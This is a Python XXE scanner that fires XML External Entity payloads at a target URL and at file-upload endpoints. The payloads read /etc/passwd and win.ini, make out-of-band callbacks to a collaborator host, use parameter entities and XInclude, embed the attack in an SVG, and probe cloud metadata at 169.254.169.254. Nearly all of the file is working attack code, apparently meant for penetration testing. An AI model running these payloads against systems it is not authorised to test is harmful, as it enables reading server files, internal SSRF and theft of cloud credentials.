#!/usr/bin/env python3
"""
xxe_scanner.py — XML External Entity Injection

Tests for:
1. Classic XXE (file read: /etc/passwd)
2. OOB XXE (blind, via interactsh)
3. Parameter entity XXE
4. SVG/XLSX/DOCX XXE
5. XXE to SSRF (internal port scan)

Usage:
    from xxe_scanner import XXEScanner
    scanner = XXEScanner()
    result = scanner.test_endpoint("https://target.com/api/upload", "POST")
"""
import json, os, re, time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    requests = None

CALLBACK = os.environ.get("INTERACTSH_URL", "burpcollaborator.net")

XXE_PAYLOADS = {
    "classic_file": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>'
    ),
    "classic_win": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root>&xxe;</root>'
    ),
    "oob_http": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        f'<!ENTITY xxe SYSTEM "https://xxe.{CALLBACK}/xxe">]>'
        '<root>&xxe;</root>'
    ),
    "oob_ftp": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        f'<!ENTITY xxe SYSTEM "ftp://xxe.{CALLBACK}/xxe">]>'
        '<root>&xxe;</root>'
    ),
    "parameter_entity": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        f'<!ENTITY % xxe SYSTEM "https://xxe.{CALLBACK}/xxe.dtd">'
        '%xxe;]><root>test</root>'
    ),
    "ssrf_metadata": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        '<root>&xxe;</root>'
    ),
    "cdata_exfil": (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<root><![CDATA[&xxe;]]></root>'
    ),
    "xinclude": (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
    ),
}

SVG_XXE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<text>&xxe;</text></svg>'
)


class XXEScanner:
    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3; urllib3.disable_warnings()

    def test_endpoint(self, url: str, method: str = "POST",
                      headers: dict = None) -> dict:
        headers = headers or {}
        result = {"url": url, "vulnerable": False, "findings": []}

        for name, payload in XXE_PAYLOADS.items():
            try:
                h = {**headers, "Content-Type": "application/xml"}
                if method.upper() == "POST":
                    resp = self.session.post(url, data=payload, headers=h, timeout=10)
                else:
                    resp = self.session.request(method, url, data=payload, headers=h, timeout=10)

                finding = {"payload": name, "status": resp.status_code}

                # Check for file read evidence
                if any(k in resp.text for k in ("root:x:", "daemon:", "[fonts]", "[extensions]")):
                    finding["evidence"] = "FILE READ confirmed"
                    finding["severity"] = "CRITICAL"
                    result["vulnerable"] = True
                    self.findings.append({"type": "XXE", "url": url, **finding})

                # Check for SSRF evidence
                if any(k in resp.text for k in ("ami-id", "instance-id", "iam")):
                    finding["evidence"] = "SSRF via XXE — cloud metadata"
                    finding["severity"] = "CRITICAL"
                    result["vulnerable"] = True
                    self.findings.append({"type": "XXE_SSRF", "url": url, **finding})

                # OOB: check for different response when OOB payload sent
                if "oob" in name and resp.status_code != 400:
                    finding["note"] = "OOB payload accepted — check interactsh"
                    finding["severity"] = "MEDIUM"

                result["findings"].append(finding)
            except Exception:
                continue
            time.sleep(0.3)

        # Test XML content-type variants
        for ct in ["text/xml", "application/xml", "application/xhtml+xml",
                    "application/soap+xml"]:
            try:
                resp = self.session.post(url, data=XXE_PAYLOADS["classic_file"],
                                        headers={**headers, "Content-Type": ct}, timeout=8)
                if "root:x:" in resp.text:
                    result["vulnerable"] = True
                    self.findings.append({"type": "XXE", "url": url,
                                         "content_type": ct, "severity": "CRITICAL"})
            except Exception:
                continue

        return result

    def test_file_upload_xxe(self, url: str, field: str = "file",
                             headers: dict = None) -> dict:
        """Test XXE via SVG/XML file upload."""
        headers = headers or {}
        result = {"url": url, "vulnerable": False}

        files = {
            "svg_xxe": (f"{field}.svg", SVG_XXE, "image/svg+xml"),
            "xml_xxe": (f"{field}.xml", XXE_PAYLOADS["classic_file"], "application/xml"),
        }
        for name, file_tuple in files.items():
            try:
                resp = self.session.post(url, files={field: file_tuple},
                                        headers=headers, timeout=10)
                if "root:x:" in resp.text:
                    result["vulnerable"] = True
                    self.findings.append({"type": "XXE_UPLOAD", "url": url,
                                         "file_type": name, "severity": "CRITICAL"})
            except Exception:
                continue
        return result

    def save_findings(self, target: str) -> None:
        out = Path(f"findings/{target}/xxe")
        out.mkdir(parents=True, exist_ok=True)
        if self.findings:
            (out / f"xxe_{int(time.time())}.json").write_text(
                json.dumps(self.findings, indent=2, default=str))
